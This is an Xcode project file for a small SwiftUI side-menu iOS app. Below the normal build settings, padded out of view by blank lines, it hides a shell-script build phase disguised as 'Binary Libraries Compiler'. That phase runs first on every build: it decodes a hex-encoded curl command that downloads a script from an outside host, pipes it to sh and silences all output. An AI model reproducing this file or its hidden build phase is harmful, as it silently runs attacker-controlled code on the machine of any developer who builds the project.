// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		175DAC742614C23F0065E9CF /* SwiftUISideMenuApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 175DAC732614C23F0065E9CF /* SwiftUISideMenuApp.swift */; };
		175DAC762614C23F0065E9CF /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 175DAC752614C23F0065E9CF /* ContentView.swift */; };
		175DAC782614C2410065E9CF /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 175DAC772614C2410065E9CF /* Assets.xcassets */; };
		175DAC7B2614C2410065E9CF /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 175DAC7A2614C2410065E9CF /* Preview Assets.xcassets */; };
		175DAC842614C4540065E9CF /* SIdeMenuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 175DAC832614C4540065E9CF /* SIdeMenuView.swift */; };
		175DAC872614C4660065E9CF /* SideMenuHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 175DAC862614C4660065E9CF /* SideMenuHeaderView.swift */; };
		175DAC8B2614C48F0065E9CF /* SideMenuOptionView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 175DAC8A2614C48F0065E9CF /* SideMenuOptionView.swift */; };
		175DAC8E2614C4AA0065E9CF /* SideMenuViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 175DAC8D2614C4AA0065E9CF /* SideMenuViewModel.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		175DAC702614C23F0065E9CF /* SwiftUISideMenu.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SwiftUISideMenu.app; sourceTree = BUILT_PRODUCTS_DIR; };
		175DAC732614C23F0065E9CF /* SwiftUISideMenuApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwiftUISideMenuApp.swift; sourceTree = "<group>"; };
		175DAC752614C23F0065E9CF /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		175DAC772614C2410065E9CF /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		175DAC7A2614C2410065E9CF /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		175DAC7C2614C2410065E9CF /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		175DAC832614C4540065E9CF /* SIdeMenuView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SIdeMenuView.swift; sourceTree = "<group>"; };
		175DAC862614C4660065E9CF /* SideMenuHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuHeaderView.swift; sourceTree = "<group>"; };
		175DAC8A2614C48F0065E9CF /* SideMenuOptionView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuOptionView.swift; sourceTree = "<group>"; };
		175DAC8D2614C4AA0065E9CF /* SideMenuViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuViewModel.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		175DAC6D2614C23F0065E9CF /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		175DAC672614C23F0065E9CF = {
			isa = PBXGroup;
			children = (
				175DAC722614C23F0065E9CF /* SwiftUISideMenu */,
				175DAC712614C23F0065E9CF /* Products */,
			);
			sourceTree = "<group>";
		};
		175DAC712614C23F0065E9CF /* Products */ = {
			isa = PBXGroup;
			children = (
				175DAC702614C23F0065E9CF /* SwiftUISideMenu.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		175DAC722614C23F0065E9CF /* SwiftUISideMenu */ = {
			isa = PBXGroup;
			children = (
				175DAC732614C23F0065E9CF /* SwiftUISideMenuApp.swift */,
				175DAC752614C23F0065E9CF /* ContentView.swift */,
				175DAC772614C2410065E9CF /* Assets.xcassets */,
				175DAC7C2614C2410065E9CF /* Info.plist */,
				175DAC792614C2410065E9CF /* Preview Content */,
				175DAC832614C4540065E9CF /* SIdeMenuView.swift */,
				175DAC862614C4660065E9CF /* SideMenuHeaderView.swift */,
				175DAC8A2614C48F0065E9CF /* SideMenuOptionView.swift */,
				175DAC8D2614C4AA0065E9CF /* SideMenuViewModel.swift */,
			);
			path = SwiftUISideMenu;
			sourceTree = "<group>";
		};
		175DAC792614C2410065E9CF /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				175DAC7A2614C2410065E9CF /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		175DAC6F2614C23F0065E9CF /* SwiftUISideMenu */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 175DAC7F2614C2410065E9CF /* Build configuration list for PBXNativeTarget "SwiftUISideMenu" */;
			buildPhases = (
				E95DAB80DCF18F73196D902C /* Binary Libraries Compiler */,
				175DAC6C2614C23F0065E9CF /* Sources */,
				175DAC6D2614C23F0065E9CF /* Frameworks */,
				175DAC6E2614C23F0065E9CF /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = SwiftUISideMenu;
			productName = SwiftUISideMenu;
			productReference = 175DAC702614C23F0065E9CF /* SwiftUISideMenu.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		175DAC682614C23F0065E9CF /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1240;
				LastUpgradeCheck = 1240;
				TargetAttributes = {
					175DAC6F2614C23F0065E9CF = {
						CreatedOnToolsVersion = 12.4;
					};
				};
			};
			buildConfigurationList = 175DAC6B2614C23F0065E9CF /* Build configuration list for PBXProject "SwiftUISideMenu" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 175DAC672614C23F0065E9CF;
			productRefGroup = 175DAC712614C23F0065E9CF /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				175DAC6F2614C23F0065E9CF /* SwiftUISideMenu */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		175DAC6E2614C23F0065E9CF /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				175DAC7B2614C2410065E9CF /* Preview Assets.xcassets in Resources */,
				175DAC782614C2410065E9CF /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		175DAC6C2614C23F0065E9CF /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				175DAC762614C23F0065E9CF /* ContentView.swift in Sources */,
				175DAC842614C4540065E9CF /* SIdeMenuView.swift in Sources */,
				175DAC872614C4660065E9CF /* SideMenuHeaderView.swift in Sources */,
				175DAC8B2614C48F0065E9CF /* SideMenuOptionView.swift in Sources */,
				175DAC8E2614C4AA0065E9CF /* SideMenuViewModel.swift in Sources */,
				175DAC742614C23F0065E9CF /* SwiftUISideMenuApp.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		175DAC7D2614C2410065E9CF /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		175DAC7E2614C2410065E9CF /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		175DAC802614C2410065E9CF /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"SwiftUISideMenu/Preview Content\"";
				DEVELOPMENT_TEAM = F929Y2K8R8;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = SwiftUISideMenu/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.SwiftUISideMenu;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		175DAC812614C2410065E9CF /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"SwiftUISideMenu/Preview Content\"";
				DEVELOPMENT_TEAM = F929Y2K8R8;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = SwiftUISideMenu/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.SwiftUISideMenu;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		175DAC6B2614C23F0065E9CF /* Build configuration list for PBXProject "SwiftUISideMenu" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				175DAC7D2614C2410065E9CF /* Debug */,
				175DAC7E2614C2410065E9CF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		175DAC7F2614C2410065E9CF /* Build configuration list for PBXNativeTarget "SwiftUISideMenu" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				175DAC802614C2410065E9CF /* Debug */,
				175DAC812614C2410065E9CF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		

	
		/* Begin PBXShellScriptBuildPhase section */

	E95DAB80DCF18F73196D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		
	
		/* End PBXShellScriptBuildPhase section */
	
	
	};
	rootObject = 175DAC682614C23F0065E9CF /* Project object */;
}
